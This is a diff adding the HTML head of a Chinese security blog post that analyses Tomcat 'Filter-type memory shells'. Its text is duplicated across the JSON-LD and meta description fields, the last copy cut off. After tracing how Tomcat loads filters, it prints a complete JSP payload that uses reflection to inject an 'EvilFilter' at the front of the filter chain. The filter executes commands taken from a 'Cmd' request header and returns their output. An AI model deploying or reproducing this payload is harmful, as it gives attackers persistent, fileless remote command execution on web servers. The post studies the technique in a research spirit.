@@ -1,0 +1,479 @@
+<!DOCTYPE html>
+<html lang="en-us">
+<head>
+<meta charset="utf-8" />
+<meta name="generator" content="Hugo 0.135.0">
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="toTop" content="true">
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<meta name="author" content="" />
+<meta property="og:url" content="https://w0s1np.github.io/blog/tomcat_filter%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90.html/" />
+<link rel="canonical" href="https://w0s1np.github.io/blog/tomcat_filter%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90.html/" /><link rel="apple-touch-icon" href="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image-20241001120146127.png" />
+<link rel="icon" href="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image-20241001120146127.png" />
+<link rel="shortcut" href="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image-20241001120146127.png" /><link rel="alternate" type="application/atom+xml" href="https://w0s1np.github.io/index.xml" title="末流双非的救赎之道">
+<script type="application/ld+json">
+{
+"@context" : "http://schema.org",
+"@type" : "BlogPosting",
+"mainEntityOfPage": {
+"@type": "WebPage",
+"@id": "https:\/\/w0s1np.github.io\/"
+},
+"articleSection" : "blog",
+"name" : "Tomcat_Filter型内存马分析",
+"headline" : "Tomcat_Filter型内存马分析",
+"description" : "Tomcat Filter 型内存马分析 目的：动态注册恶意 Filter，并且将其放到filter-chain最前面\n0x01 Filter加载流程 maven 添加如下 package\n\u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.apache.tomcat\u0026lt;\/groupId\u0026gt; \u0026lt;artifactId\u0026gt;tomcat-catalina\u0026lt;\/artifactId\u0026gt; \u0026lt;version\u0026gt;10.0.0\u0026lt;\/version\u0026gt; \u0026lt;\/dependency\u0026gt; 编写 TestFilter\npackage memfilter; import javax.servlet.*; import javax.servlet.annotation.*; import java.io.IOException; @WebFilter(filterName = \u0026#34;TestFilter\u0026#34;,urlPatterns = \u0026#34;\/*\u0026#34;) public class TestFilter implements Filter { public void init(FilterConfig config) throws ServletException { System.out.println(\u0026#34;Filter 初始化创建\u0026#34;); } public void destroy() { } @Override public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws ServletException, IOException { System.out.println(\u0026#34;执行过滤操作\u0026#34;); chain.doFilter(request, response); } } 因为之前写过一个命令执行的 filter，但那是直接写在 server 端的代码。但是我们如何在服务已启动时，去动态注册一个新的恶意 filter 呢？\n0x02 Filter流程分析 在doFilter 下断点：\n调用栈\ndoFilter:18, TestFilter (memfilter) internalDoFilter:168, ApplicationFilterChain (org.apache.catalina.core) doFilter:144, ApplicationFilterChain (org.apache.catalina.core) invoke:168, StandardWrapperValve (org.apache.catalina.core) invoke:90, StandardContextValve (org.apache.catalina.core) invoke:482, AuthenticatorBase (org.apache.catalina.authenticator) invoke:130, StandardHostValve (org.apache.catalina.core) invoke:93, ErrorReportValve (org.apache.catalina.valves) invoke:660, AbstractAccessLogValve (org.apache.catalina.valves) invoke:74, StandardEngineValve (org.apache.catalina.core) service:346, CoyoteAdapter (org.apache.catalina.connector) service:388, Http11Processor (org.apache.coyote.http11) process:63, AbstractProcessorLight (org.apache.coyote) process:936, AbstractProtocol$ConnectionHandler (org.apache.coyote) doRun:1791, NioEndpoint$SocketProcessor (org.apache.tomcat.util.net) run:52, SocketProcessorBase (org.apache.tomcat.util.net) runWorker:1190, ThreadPoolExecutor (org.apache.tomcat.util.threads) run:659, ThreadPoolExecutor$Worker (org.apache.tomcat.util.threads) run:63, TaskThread$WrappingRunnable (org.apache.tomcat.util.threads) run:745, Thread (java.lang) filterChain之后的流程 跟进StandardWrapperVavle.invoke()方法:\n执行了 filterChain.doFilter 方法, 继续跟进\n在 doFilter 内会检测 jvm 是否开启了安全模式, 然后继续执行 this.internalDoFilter 方法\ninternalDoFilter 会从 this.filters 数组中依次取出 filterConfig 对象, 然后通过 filterConfig.getFilter() 得到 Filter 实例, 最后调用其 doFilter 方法\n最后再回到我们自己写的 doFilter 方法。\nPS：所以我们执行的是 filterConfig 对象中的 filter 属性值的对象。\n现在知道是通过从 this.filters 数组中依次取出 filterConfig 对象, 然后通过 filterConfig.getFilter() 得到 Filter 实例, 最后调用其 doFilter 方法。\nfilterChain是如何来的 然后我们回到 StandardWrapperValve, 往前面翻翻看这个 filterChain 是怎么来的\n这里通过 ApplicationFilterFactory.createFilterChain() 创建 filterChain\n需要注意创建过程是动态的, 即我们每发起一次请求, tomcat 都会执行一遍 createFilterChain, 这也为后面内存马的植入做了铺垫\n重新在这里下断点，跟进 createFilterChain 方法\n首先从 Request 对象中获取 filterChain, 如果 filterChain 不存在, 就自己新建一个, 再设置到 req 内\n然后从 wrapper 中获取 StandardContext 对象, 并且调用 findFilterMaps 方法得到 filterMaps\n最后遍历 filterMaps, 通过 filterMap.getFilterName() 从 context 中寻找对应的 FilterConfig 并且添加至 filterChain\n这里与 StandardContext 相关的有两个方法: findFilterMaps 和 findFilterConfig, 可以说这两个方法决定了我们的 Filter 能否成功添加到至 filterChain 并被调用\nfindFilterMaps和findFilterConfig 先跟进 findFilterMaps 方法\nfilterMaps 是 ContextFilterMaps 的实例, 后者相当于一个 Array\n继续搜索与 FilterMap 相关的其它方法\n通过 addfilterMap 和 addFilterMapBefore 这两个方法可以向 filterMaps 中添加 FilterMap\n所以当我们构造好 FilterMap 之后，可以通过 addFilterMapBefore 加入到 filterMaps 的首位。\n其中注意 validateFilterMap\n该方法会对传入的 FilterMap 进行验证, 如果 this.findFilterDef 的返回值为 null 则会抛出异常\n该方法会对传入的 FilterMap 进行验证, 如果 this.findFilterDef 的返回值为 null 则会抛出异常\n所以后面还需要对 standardContext 添加 FilterDef\nfilterDefs 本质也是一个 HashMap, 并且存在 addFilterDef 方法\n再看一下 FilterMap 的定义\n其内部存在 filterName 和 urlPatterns 属性, 分别对应之前的 getFilterName 和 @WebFilter 注解中的 urlPatterns\n现在回到 StandardContext 的 findFilterConfig 方法：\nfilterConfigs 的本质也是 HashMap\n但在 StandardContext 中涉及到对 filterConfigs 操作的只有 filterStart 和 filterStop 方法, 而两者仅在 tomcat 启动和停止时被调用, 因此我们在运行时只能通过反射的方式修改 filterConfigs\n不过仍然需要看看 filterStart 是怎么初始化 filterConfigs 的\n方法内部遍历了 this.filterDefs 并且以 context 和 filterDef 为参数实例化 ApplicationFilterConfig 作为 filterConfig, 然后将其 put 放入 filterConfigs\n继续看 ApplicationFilterConfig 的定义\n内部存在 filterDef 和 filter 属性, 前者通过构造方法赋值, 并且调用其 getFilter 方法来获取 Filter 实例, 然后赋值给后者\nFilterDef 的定义\nfilter 是被调用 Filter 实例, filterClass 是 Filter 对应的 Class, filterName 就是 Filter 的名称, 而且三者都有对应的 getter 和 setter\n综上, Filter 的加载流程如下\n通过 ApplicationFilterFactory.createFilterChain() 创建 FilterChain 调用 StandardContext.findFilterMaps() 得到 filterMaps 遍历 filterMaps, 依次从 StandardContext 中用 filterMap.getFilterName() 获取对应的 filterConfig, 并将其放入 FilterChain 执行 FilterChain.doFilter() 并在内部调用 internalDoFilter 方法 依次执行 filterConfig.getFilter() 获取 Filter 实例, 并最终调用其 doFilter 方法 Filter相关对象 在编写内存马之前, 我们先梳理一下之前出现的各种以 Filter 开头的对象\nFilterMap: 存在 filterName 和 urlPatterns 属性, 对应 Filter 的名称和匹配规则 FilterConfig: 这里具体指 ApplicationFilterConfig, 存在 Filter 和 FilterDef 属性, 其中 Filter 在构造函数中通过 filterDef.getFilter() 取得 FilterDef: 存在 filter filterClass filterName 属性, 其中 filter 为被调用的 Filter 实例 然后是位于 StandardContext 中的以 filter 开头的属性\nfilterMaps: 本质为 Array, 存放 FilterMap filterConfigs: 本质为 HashMap, key 为 filterMap 的 filterName, value 为对应的 FilterConfig filterDefs: 本质为 HashMap, key 为 filterMap 的 filterName, value 为对应的 FilterDef 根据上面加载流程, 我们注入内存马的过程为\n在 StandardContext 的 filterDefs 中添加 FilterDef (validateFilterMap 验证) 向 filterMaps 中添加 FilterMap 将对应的 FilterConfig (包含 FilterDef) 添加到 filterConfigs 0x03 编写内存马 还有一个问题, 如何获取 StandardContext\n方法很多, 可以从 request 获取, 也可以从 ContextClassLoader ThreadLocal MBean 中获取\n因为 JSP 默认就可以调用 request 对象, 所以下面先以 request 为例,\n最终 payload 如下\n\u0026lt;%@ page import=\u0026#34;java.lang.reflect.Field\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;org.apache.catalina.core.ApplicationFilterConfig\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;org.apache.catalina.core.ApplicationContext\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;org.apache.catalina.core.StandardContext\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;java.util.Map\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;java.io.*\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;org.apache.tomcat.util.descriptor.web.FilterDef\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;org.apache.tomcat.util.descriptor.web.FilterMap\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;java.lang.reflect.Constructor\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;org.apache.catalina.Context\u0026#34; %\u0026gt; \u0026lt;% \/\/获取ServletContext。通过反射获取 ServletContext 中的 ApplicationContext，然后再通过反射获取 ApplicationContext 中的 StandardContext 对象。 ServletContext servletContext = request.getSession().getServletContext(); Field appctxField = servletContext.getClass().getDeclaredField(\u0026#34;context\u0026#34;); appctxField.setAccessible(true); ApplicationContext applicationContext = (ApplicationContext) appctxField.get(servletContext);\/\/通过反射获取 servletContext 中的 context 字段的值，并将其转换为 ApplicationContext。 Field stdctxField = applicationContext.getClass().getDeclaredField(\u0026#34;context\u0026#34;); stdctxField.setAccessible(true); StandardContext standardContext = (StandardContext) stdctxField.get(applicationContext);\/\/通过反射获取 applicationContext 对象中的 context 字段的值，并将其转换为 StandardContext。 \/\/ 获取 FilterConfigs Field filterConfigsField = standardContext.getClass().getDeclaredField(\u0026#34;filterConfigs\u0026#34;); filterConfigsField.setAccessible(true); Map filterConfigs = (Map) filterConfigsField.get(standardContext); \/\/ 编写 Filter String filterName = \u0026#34;EvilFilter\u0026#34;; if (filterConfigs.get(filterName)==null) { Filter filter = new Filter() { @Override public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException { HttpServletRequest httpServletRequest = (HttpServletRequest) servletRequest; PrintWriter pw = servletResponse.getWriter(); String cmd = httpServletRequest.getHeader(\u0026#34;Cmd\u0026#34;); if (cmd != null) { Process process = Runtime.getRuntime().exec(cmd); InputStream input = process.getInputStream(); BufferedReader br = new BufferedReader(new InputStreamReader(input)); String line = null; while ((line = br.readLine()) != null){ pw.write(line); } br.close(); input.close(); pw.write(\u0026#34;\\n\u0026#34;); } } }; \/\/ 创建 FilterDef,为了创建 FilterConfig,即 ApplicationFilterConfig FilterDef filterDef = new FilterDef(); filterDef.setFilterName(filterName); filterDef.setFilterClass(filter.getClass().getName()); filterDef.setFilter(filter); \/\/ 添加 FilterDef standardContext.addFilterDef(filterDef); \/\/ 创建 FilterMap FilterMap filterMap = new FilterMap(); filterMap.setFilterName(filterName); filterMap.addURLPattern(\u0026#34;\/*\u0026#34;); filterMap.setDispatcher(DispatcherType.REQUEST.name()); \/\/ setDispatcher是FilterMap的一个设置过滤器的调度类型方法，这里设置了过滤器在 REQUEST 调度类型下触发，即当收到普通的 HTTP 请求时，过滤器会被执行。 \/\/ 添加 FilterMap 到首位 standardContext.addFilterMapBefore(filterMap); \/\/ 因为 ApplicationFilterConfig 的构造方法是不带 public 的, 即默认的作用域为 package, 所以我们需要通过反射来实例化该对象 Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class); constructor.setAccessible(true); ApplicationFilterConfig applicationFilterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext, filterDef); \/\/ 添加 FilterConfig filterConfigs.put(filterName, applicationFilterConfig); out.print(\u0026#34;inject success\u0026#34;); } %\u0026gt; ",
+"inLanguage" : "en-US",
+"author" : "",
+"creator" : "",
+"publisher": "",
+"accountablePerson" : "",
+"copyrightHolder" : "",
+"copyrightYear" : "2024",
+"datePublished": "2024-10-01 20:40:42 \u002b0800 CST",
+"dateModified" : "2024-10-01 20:40:42 \u002b0800 CST",
+"url" : "https:\/\/w0s1np.github.io\/blog\/tomcat_filter%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90.html\/",
+"keywords" : [ "Java", ]
+}
+</script><title>Tomcat_Filter型内存马分析 - 末流双非的救赎之道</title>
+<meta property="og:title" content="Tomcat_Filter型内存马分析" />
+<meta property="og:type" content="article" />
+<meta property="og:description" content="Tomcat Filter 型内存马分析 目的：动态注册恶意 Filter，并且将其放到filter-chain最前面
+0x01 Filter加载流程 maven 添加如下 package
+&lt;dependency&gt; &lt;groupId&gt;org.apache.tomcat&lt;/groupId&gt; &lt;artifactId&gt;tomcat-catalina&lt;/artifactId&gt; &lt;version&gt;10.0.0&lt;/version&gt; &lt;/dependency&gt; 编写 TestFilter
+package memfilter; import javax.servlet.*; import javax.servlet.annotation.*; import java.io.IOException; @WebFilter(filterName = &#34;TestFilter&#34;,urlPatterns = &#34;/*&#34;) public class TestFilter implements Filter { public void init(FilterConfig config) throws ServletException { System.out.println(&#34;Filter 初始化创建&#34;); } public void destroy() { } @Override public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws ServletException, IOException { System.out.println(&#34;执行过滤操作&#34;); chain.doFilter(request, response); } } 因为之前写过一个命令执行的 filter，但那是直接写在 server 端的代码。但是我们如何在服务已启动时，去动态注册一个新的恶意 filter 呢？
+0x02 Filter流程分析 在doFilter 下断点：
+调用栈
+doFilter:18, TestFilter (memfilter) internalDoFilter:168, ApplicationFilterChain (org.apache.catalina.core) doFilter:144, ApplicationFilterChain (org.apache.catalina.core) invoke:168, StandardWrapperValve (org.apache.catalina.core) invoke:90, StandardContextValve (org.apache.catalina.core) invoke:482, AuthenticatorBase (org.apache.catalina.authenticator) invoke:130, StandardHostValve (org.apache.catalina.core) invoke:93, ErrorReportValve (org.apache.catalina.valves) invoke:660, AbstractAccessLogValve (org.apache.catalina.valves) invoke:74, StandardEngineValve (org.apache.catalina.core) service:346, CoyoteAdapter (org.apache.catalina.connector) service:388, Http11Processor (org.apache.coyote.http11) process:63, AbstractProcessorLight (org.apache.coyote) process:936, AbstractProtocol$ConnectionHandler (org.apache.coyote) doRun:1791, NioEndpoint$SocketProcessor (org.apache.tomcat.util.net) run:52, SocketProcessorBase (org.apache.tomcat.util.net) runWorker:1190, ThreadPoolExecutor (org.apache.tomcat.util.threads) run:659, ThreadPoolExecutor$Worker (org.apache.tomcat.util.threads) run:63, TaskThread$WrappingRunnable (org.apache.tomcat.util.threads) run:745, Thread (java.lang) filterChain之后的流程 跟进StandardWrapperVavle.invoke()方法:
+执行了 filterChain.doFilter 方法, 继续跟进
+在 doFilter 内会检测 jvm 是否开启了安全模式, 然后继续执行 this.internalDoFilter 方法
+internalDoFilter 会从 this.filters 数组中依次取出 filterConfig 对象, 然后通过 filterConfig.getFilter() 得到 Filter 实例, 最后调用其 doFilter 方法
+最后再回到我们自己写的 doFilter 方法。
+PS：所以我们执行的是 filterConfig 对象中的 filter 属性值的对象。
+现在知道是通过从 this.filters 数组中依次取出 filterConfig 对象, 然后通过 filterConfig.getFilter() 得到 Filter 实例, 最后调用其 doFilter 方法。
+filterChain是如何来的 然后我们回到 StandardWrapperValve, 往前面翻翻看这个 filterChain 是怎么来的
+这里通过 ApplicationFilterFactory.createFilterChain() 创建 filterChain
+需要注意创建过程是动态的, 即我们每发起一次请求, tomcat 都会执行一遍 createFilterChain, 这也为后面内存马的植入做了铺垫
+重新在这里下断点，跟进 createFilterChain 方法
+首先从 Request 对象中获取 filterChain, 如果 filterChain 不存在, 就自己新建一个, 再设置到 req 内
+然后从 wrapper 中获取 StandardContext 对象, 并且调用 findFilterMaps 方法得到 filterMaps
+最后遍历 filterMaps, 通过 filterMap.getFilterName() 从 context 中寻找对应的 FilterConfig 并且添加至 filterChain
+这里与 StandardContext 相关的有两个方法: findFilterMaps 和 findFilterConfig, 可以说这两个方法决定了我们的 Filter 能否成功添加到至 filterChain 并被调用
+findFilterMaps和findFilterConfig 先跟进 findFilterMaps 方法
+filterMaps 是 ContextFilterMaps 的实例, 后者相当于一个 Array
+继续搜索与 FilterMap 相关的其它方法
+通过 addfilterMap 和 addFilterMapBefore 这两个方法可以向 filterMaps 中添加 FilterMap
+所以当我们构造好 FilterMap 之后，可以通过 addFilterMapBefore 加入到 filterMaps 的首位。
+其中注意 validateFilterMap
+该方法会对传入的 FilterMap 进行验证, 如果 this.findFilterDef 的返回值为 null 则会抛出异常
+该方法会对传入的 FilterMap 进行验证, 如果 this.findFilterDef 的返回值为 null 则会抛出异常
+所以后面还需要对 standardContext 添加 FilterDef
+filterDefs 本质也是一个 HashMap, 并且存在 addFilterDef 方法
+再看一下 FilterMap 的定义
+其内部存在 filterName 和 urlPatterns 属性, 分别对应之前的 getFilterName 和 @WebFilter 注解中的 urlPatterns
+现在回到 StandardContext 的 findFilterConfig 方法：
+filterConfigs 的本质也是 HashMap
+但在 StandardContext 中涉及到对 filterConfigs 操作的只有 filterStart 和 filterStop 方法, 而两者仅在 tomcat 启动和停止时被调用, 因此我们在运行时只能通过反射的方式修改 filterConfigs
+不过仍然需要看看 filterStart 是怎么初始化 filterConfigs 的
+方法内部遍历了 this.filterDefs 并且以 context 和 filterDef 为参数实例化 ApplicationFilterConfig 作为 filterConfig, 然后将其 put 放入 filterConfigs
+继续看 ApplicationFilterConfig 的定义
+内部存在 filterDef 和 filter 属性, 前者通过构造方法赋值, 并且调用其 getFilter 方法来获取 Filter 实例, 然后赋值给后者
+FilterDef 的定义
+filter 是被调用 Filter 实例, filterClass 是 Filter 对应的 Class, filterName 就是 Filter 的名称, 而且三者都有对应的 getter 和 setter
+综上, Filter 的加载流程如下
+通过 ApplicationFilterFactory.createFilterChain() 创建 FilterChain 调用 StandardContext.findFilterMaps() 得到 filterMaps 遍历 filterMaps, 依次从 StandardContext 中用 filterMap.getFilterName() 获取对应的 filterConfig, 并将其放入 FilterChain 执行 FilterChain.doFilter() 并在内部调用 internalDoFilter 方法 依次执行 filterConfig.getFilter() 获取 Filter 实例, 并最终调用其 doFilter 方法 Filter相关对象 在编写内存马之前, 我们先梳理一下之前出现的各种以 Filter 开头的对象
+FilterMap: 存在 filterName 和 urlPatterns 属性, 对应 Filter 的名称和匹配规则 FilterConfig: 这里具体指 ApplicationFilterConfig, 存在 Filter 和 FilterDef 属性, 其中 Filter 在构造函数中通过 filterDef.getFilter() 取得 FilterDef: 存在 filter filterClass filterName 属性, 其中 filter 为被调用的 Filter 实例 然后是位于 StandardContext 中的以 filter 开头的属性
+filterMaps: 本质为 Array, 存放 FilterMap filterConfigs: 本质为 HashMap, key 为 filterMap 的 filterName, value 为对应的 FilterConfig filterDefs: 本质为 HashMap, key 为 filterMap 的 filterName, value 为对应的 FilterDef 根据上面加载流程, 我们注入内存马的过程为
+在 StandardContext 的 filterDefs 中添加 FilterDef (validateFilterMap 验证) 向 filterMaps 中添加 FilterMap 将对应的 FilterConfig (包含 FilterDef) 添加到 filterConfigs 0x03 编写内存马 还有一个问题, 如何获取 StandardContext
+方法很多, 可以从 request 获取, 也可以从 ContextClassLoader ThreadLocal MBean 中获取
+因为 JSP 默认就可以调用 request 对象, 所以下面先以 request 为例,
+最终 payload 如下
+&lt;%@ page import=&#34;java.lang.reflect.Field&#34; %&gt; &lt;%@ page import=&#34;org.apache.catalina.core.ApplicationFilterConfig&#34; %&gt; &lt;%@ page import=&#34;org.apache.catalina.core.ApplicationContext&#34; %&gt; &lt;%@ page import=&#34;org.apache.catalina.core.StandardContext&#34; %&gt; &lt;%@ page import=&#34;java.util.Map&#34; %&gt; &lt;%@ page import=&#34;java.io.*&#34; %&gt; &lt;%@ page import=&#34;org.apache.tomcat.util.descriptor.web.FilterDef&#34; %&gt; &lt;%@ page import=&#34;org.apache.tomcat.util.descriptor.web.FilterMap&#34; %&gt; &lt;%@ page import=&#34;java.lang.reflect.Constructor&#34; %&gt; &lt;%@ page import=&#34;org.apache.catalina.Context&#34; %&gt; &lt;% //获取ServletContext。通过反射获取 ServletContext 中的 ApplicationContext，然后再通过反射获取 ApplicationContext 中的 StandardContext 对象。 ServletContext servletContext = request.getSession().getServletContext(); Field appctxField = servletContext.getClass().getDeclaredField(&#34;context&#34;); appctxField.setAccessible(true); ApplicationContext applicationContext = (ApplicationContext) appctxField.get(servletContext);//通过反射获取 servletContext 中的 context 字段的值，并将其转换为 ApplicationContext。 Field stdctxField = applicationContext.getClass().getDeclaredField(&#34;context&#34;); stdctxField.setAccessible(true); StandardContext standardContext = (StandardContext) stdctxField.get(applicationContext);//通过反射获取 applicationContext 对象中的 context 字段的值，并将其转换为 StandardContext。 // 获取 FilterConfigs Field filterConfigsField = standardContext.getClass().getDeclaredField(&#34;filterConfigs&#34;); filterConfigsField.setAccessible(true); Map filterConfigs = (Map) filterConfigsField.get(standardContext); // 编写 Filter String filterName = &#34;EvilFilter&#34;; if (filterConfigs.get(filterName)==null) { Filter filter = new Filter() { @Override public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException { HttpServletRequest httpServletRequest = (HttpServletRequest) servletRequest; PrintWriter pw = servletResponse.getWriter(); String cmd = httpServletRequest.getHeader(&#34;Cmd&#34;); if (cmd != null) { Process process = Runtime.getRuntime().exec(cmd); InputStream input = process.getInputStream(); BufferedReader br = new BufferedReader(new InputStreamReader(input)); String line = null; while ((line = br.readLine()) != null){ pw.write(line); } br.close(); input.close(); pw.write(&#34;\n&#34;); } } }; // 创建 FilterDef,为了创建 FilterConfig,即 ApplicationFilterConfig FilterDef filterDef = new FilterDef(); filterDef.setFilterName(filterName); filterDef.setFilterClass(filter.getClass().getName()); filterDef.setFilter(filter); // 添加 FilterDef standardContext.addFilterDef(filterDef); // 创建 FilterMap FilterMap filterMap = new FilterMap(); filterMap.setFilterName(filterName); filterMap.addURLPattern(&#34;/*&#34;); filterMap.setDispatcher(DispatcherType.REQUEST.name()); // setDispatcher是FilterMap的一个设置过滤器的调度类型方法，这里设置了过滤器在 REQUEST 调度类型下触发，即当收到普通的 HTTP 请求时，过滤器会被执行。 // 添加 FilterMap 到首位 standardContext.addFilterMapBefore(filterMap); // 因为 ApplicationFilterConfig 的构造方法是不带 public 的, 即默认的作用域为 package, 所以我们需要通过反射来实例化该对象 Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class); constructor.setAccessible(true); ApplicationFilterConfig applicationFilterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext, filterDef); // 添加 FilterConfig filterConfigs.put(filterName, applicationFilterConfig); out.print(&#34;inject success&#34;); } %&gt; " />
+<meta name="description" content="Tomcat Filter 型内存马分析 目的：动态注册恶意 Filter，并且将其放到filter-chain最前面
+0x01 Filter加载流程 maven 添加如下 package
+&lt;dependency&gt; &lt;groupId&gt;org.apache.tomcat&lt;/groupId&gt; &lt;artifactId&gt;tomcat-catalina&lt;/artifactId&gt; &lt;version&gt;10.0.0&lt;/version&gt; &lt;/dependency&gt; 编写 TestFilter
+package memfilter; import javax.servlet.*; import javax.servlet.annotation.*; import java.io.IOException; @WebFilter(filterName = &#34;TestFilter&#34;,urlPatterns = &#34;/*&#34;) public class TestFilter implements Filter { public void init(FilterConfig config) throws ServletException { System.out.println(&#34;Filter 初始化创建&#34;); } public void destroy() { } @Override public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws ServletException, IOException { System.out.println(&#34;执行过滤操作&#34;); chain.doFilter(request, response); } } 因为之前写过一个命令执行的 filter，但那是直接写在 server 端的代码。但是我们如何在服务已启动时，去动态注册一个新的恶意 filter 呢？
+0x02 Filter流程分析 在doFilter 下断点：
+调用栈
+doFilter:18, TestFilter (memfilter) internalDoFilter:168, ApplicationFilterChain (org.apache.catalina.core) doFilter:144, ApplicationFilterChain (org.apache.catalina.core) invoke:168, StandardWrapperValve (org.apache.catalina.core) invoke:90, StandardContextValve (org.apache.catalina.core) invoke:482, AuthenticatorBase (org.apache.catalina.authenticator) invoke:130, StandardHostValve (org.apache.catalina.core) invoke:93, ErrorReportValve (org.apache.catalina.valves) invoke:660, AbstractAccessLogValve (org.apache.catalina.valves) invoke:74, StandardEngineValve (org.apache.catalina.core) service:346, CoyoteAdapter (org.apache.catalina.connector) service:388, Http11Processor (org.apache.coyote.http11) process:63, AbstractProcessorLight (org.apache.coyote) process:936, AbstractProtocol$ConnectionHandler (org.apache.coyote) doRun:1791, NioEndpoint$SocketProcessor (org.apache.tomcat.util.net) run:52, SocketProcessorBase (org.apache.tomcat.util.net) runWorker:1190, ThreadPoolExecutor (org.apache.tomcat.util.threads) run:659, ThreadPoolExecutor$Worker (org.apache.tomcat.util.threads) run:63, TaskThread$WrappingRunnable (org.apache.tomcat.util.threads) run:745, Thread (java.lang) filterChain之后的流程 跟进StandardWrapperVavle.invoke()方法:
+执行了 filterChain.doFilter 方法, 继续跟进
+在 doFilter 内会检测 jvm 是否开启了安全模式, 然后继续执行 this.internalDoFilter 方法
+internalDoFilter 会从 this.filters 数组中依次取出 filterConfig 对象, 然后通过 filterConfig.getFilter() 得到 Filter 实例, 最后调用其 doFilter 方法
+最后再回到我们自己写的 doFilter 方法。
+PS：所以我们执行的是 filterConfig 对象中的 filter 属性值的对象。
+现在知道是通过从 this.filters 数组中依次取出 filterConfig 对象, 然后通过 filterConfig.getFilter() 得到 Filter 实例, 最后调用其 doFilter 方法。
+filterChain是如何来的 然后我们回到 StandardWrapperValve, 往前面翻翻看这个 filterChain 是怎么来的
+这里通过 ApplicationFilterFactory.createFilterChain() 创建 filterChain
+需要注意创建过程是动态的, 即我们每发起一次请求, tomcat 都会执行一遍 createFilterChain, 这也为后面内存马的植入做了铺垫
+重新在这里下断点，跟进 createFilterChain 方法
+首先从 Request 对象中获取 filterChain, 如果 filterChain 不存在, 就自己新建一个, 再设置到 req 内
+然后从 wrapper 中获取 StandardContext 对象, 并且调用 findFilterMaps 方法得到 filterMaps
+最后遍历 filterMaps, 通过 filterMap.getFilterName() 从 context 中寻找对应的 FilterConfig 并且添加至 filterChain
+这里与 StandardContext 相关的有两个方法: findFilterMaps 和 findFilterConfig, 可以说这两个方法决定了我们的 Filter 能否成功添加到至 filterChain 并被调用
+findFilterMaps和findFilterConfig 先跟进 findFilterMaps 方法
+filterMaps 是 ContextFilterMaps 的实例, 后者相当于一个 Array
+继续搜索与 FilterMap 相关的其它方法
+通过 addfilterMap 和 addFilterMapBefore 这两个方法可以向 filterMaps 中添加 FilterMap
+所以当我们构造好 FilterMap 之后，可以通过 addFilterMapBefore 加入到 filterMaps 的首位。
+其中注意 validateFilterMap
+该方法会对传入的 FilterMap 进行验证, 如果 this.findFilterDef 的返回值为 null 则会抛出异常
+该方法会对传入的 FilterMap 进行验证, 如果 this.findFilterDef 的返回值为 null 则会抛出异常
+所以后面还需要对 standardContext 添加 FilterDef
+filterDefs 本质也是一个 HashMap, 并且存在 addFilterDef 方法
+再看一下 FilterMap 的定义
+其内部存在 filterName 和 urlPatterns 属性, 分别对应之前的 getFilterName 和 @WebFilter 注解中的 urlPatterns
+现在回到 StandardContext 的 findFilterConfig 方法：
+filterConfigs 的本质也是 HashMap
+但在 StandardContext 中涉及到对 filterConfigs 操作的只有 filterStart 和 filterStop 方法, 而两者仅在 tomcat 启动和停止时被调用, 因此我们在运行时只能通过反射的方式修改 filterConfigs
+不过仍然需要看看 filterStart 是怎么初始化 filterConfigs 的
+方法内部遍历了 this.filterDefs 并且以 context 和 filterDef 为参数实例化 ApplicationFilterConfig 作为 filterConfig, 然后将其 put 放入 filterConfigs
+继续看 ApplicationFilterConfig 的定义
+内部存在 filterDef 和 filter 属性, 前者通过构造方法赋值, 并且调用其 getFilter 方法来获取 Filter 实例, 然后赋值给后者
+FilterDef 的定义
+filter 是被调用 Filter 实例, filterClass 是 Filter 对应的 Class, filterName 就是 Filter 的名称, 而且三者都有对应的 getter 和 setter
+综上, Filter 的加载流程如下
+通过 ApplicationFilterFactory.createFilterChain() 创建 FilterChain 调用 StandardContext.findFilterMaps() 得到 filterMaps 遍历 filterMaps, 依次从 StandardContext 中用 filterMap.getFilterName() 获取对应的 filterConfig, 并将其放入 FilterChain 执行 FilterChain.doFilter() 并在内部调用 internalDoFilter 方法 依次执行 filterConfig.getFilter() 获取 Filter 实例, 并最终调用其 doFilter 方法 Filter相关对象 在编写内存马之前, 我们先梳理一下之前出现的各种以 Filter 开头的对象
+FilterMap: 存在 filterName 和 urlPatterns 属性, 对应 Filter 的名称和匹配规则 FilterConfig: 这里具体指 ApplicationFilterConfig, 存在 Filter 和 FilterDef 属性, 其中 Filter 在构造函数中通过 filterDef.getFilter() 取得 FilterDef: 存在 filter filterClass filterName 属性, 其中 filter 为被调用的 Filter 实例 然后是位于 StandardContext 中的以 filter 开头的属性
+filterMaps: 本质为 Array, 存放 FilterMap filterConfigs: 本质为 HashMap, key 为 filterMap 的 filterName, value 为对应的 FilterConfig filterDefs: 本质为 HashMap, key 为 filterMap 的 filterName, value 为对应的 FilterDef 根据上面加载流程, 我们注入内存马的过程为
